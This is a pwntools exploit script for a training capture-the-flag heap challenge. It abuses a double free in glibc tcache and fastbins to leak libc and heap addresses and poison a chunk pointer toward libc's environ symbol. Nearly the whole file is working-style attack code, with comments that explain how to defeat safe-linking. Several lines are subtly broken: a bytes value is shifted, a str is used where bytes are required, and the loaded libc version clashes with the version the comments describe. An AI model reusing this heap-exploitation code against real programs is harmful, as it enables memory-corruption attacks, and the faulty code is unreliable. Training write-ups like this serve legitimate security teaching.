from pwn import *

# A menu asks what to do: allocate a new chunk, write, read or free one. Here we can exploit the fact that the program does not check for a block to be freed twice.
# Here we exploit T-cache with an improved implementation of key check (libc-2.34). 
# As opposite as its first versions(libc-2.30 to libc-2.32), where T-cache key was for all blocks the address of the T-cache, here it's a fully randomized canary.
# Further more, since libc-2.32, the forward pointer of every block does not point to any valid block because there is a security countermeasure called pointer protection: (<new_chunk_address> >> 12) ^ <current_head_of_the_list>. This protection is quite effective because forces an attacker to leak both the addresses of the heap and the libc.
# In the end, this libc version does not allow the use of function hooks anymore, so an attacker's main option is to hijack the execution to the libc to leak the position of the stack.

CHALL_PATH = "./fastbin_dup"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("/home/merk/odc/env/libc-2.27.so")
COMMANDS = """
b  main
c
"""

def alloc(c, size) :
    c.recvuntil(b"> ")
    c.sendline(b'1')
    c.recvuntil(b"Size: ")
    c.sendline(str(size).encode("utf-8"))
    line = c.recvline()
    index = int(line.split(b"index ")[1].split(b"!\n")[0])
    return index
    
def write(c, index, data) :
    c.recvuntil(b"> ")
    c.sendline(b'2')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))
    c.recvuntil(b"Content: ")
    c.send(data)    # here we are working with pointers, so sending a newline would break execution because '\n' would be saved instead of a valid address

def read(c, index) :
    c.recvuntil(b"> ")
    c.sendline(b'3')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))
    return c.recvline()

def free(c, index) :
    c.recvuntil(b"> ")
    c.sendline(b'4')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))

if args.REMOTE:
    c = remote("fastbin-dup.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
    else:
        c = process(CHALL_PATH)

# Leaking libc address
alloc(c, 0x500)     # Index 0 (filling the T-cache)
alloc(c, 0x10)      # Index 1 (avoid the first chunk to be consolidated to the unsorted bin)
free(c, 0)
LIBC.address = u64(read(c, 0).split(b"\n")[0].ljust(8, b"\x00")) - 0x203b20
print(f"Libc address: {hex(LIBC.address)}")

# Filling the T-cache
for i in range(10) :
    alloc(c, 0x20)      # Indices 2-11

for i in range(2, 12) :
    free(c, i)

heap_base = u64(read(c, 2).split(b"\n")[0].ljust(8, "\x00")) << 12
print(f"Leak: {heap_base:#x}")

free(c, 10)     # Free not 2 because it's in the T-cache, neither 11 because it's the last freed chunk and it will make program exit

# When allocating a new chunk, the full T-cache pops a previously freed one until it gets back empty, until that moment new chunks are allocated in the fastbins
for i in range(7) :
    alloc(c, 0x20)      # Indices 12-18

# Now the last chunk is the same as the first one, so allocating a new chunk, the first chunk of the fastbins will be moved to the T-cache (because now it is empty)
alloc(c, 0x20)          # Index 19

# environ is a symbol in the .bss section of the libc, which contains a pointer to the array of environment variables of the program, among which there is the stack
write(c, 19, p64(heap_base + 0x420) >> 12 ^ (LIBC.sym["environ"] - 8))      # 0x420 are the last 3 nibbles of the first chunk (always the same); -8 is to realign the sddress to 16 bytes (last nibble = 0)

alloc(c, 0x20)      # Index 20
alloc(c, 0x20)      # Index 21
alloc(c, 0x20)      # Index 22

# Now the execution is hijacked to the libc

c.interactive()